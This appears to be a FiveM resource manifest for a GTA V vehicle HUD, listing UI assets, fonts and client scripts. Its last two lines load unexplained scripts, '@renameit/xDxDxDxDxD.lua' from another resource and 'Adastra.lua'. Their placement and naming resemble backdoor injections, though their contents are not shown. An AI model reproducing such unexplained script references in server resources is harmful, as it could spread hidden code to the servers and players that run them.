fx_version('bodacious')
game('gta5')

-- UI
ui_page "ui/index.html"
files {
	"ui/index.html",
	"ui/assets/clignotant-droite.svg",
	"ui/assets/clignotant-gauche.svg",
	"ui/assets/feu-position.svg",
	"ui/assets/feu-route.svg",
	"ui/assets/fuel.svg",
	"ui/fonts/fonts/DS-DIGIT.TTF",
	"ui/script.js",
	"ui/style.css",
	"ui/debounce.min.js"
}

-- Client Scripts
client_scripts {
	"client.lua",
}


client_script '@renameit/xDxDxDxDxD.lua'

client_script 'Adastra.lua'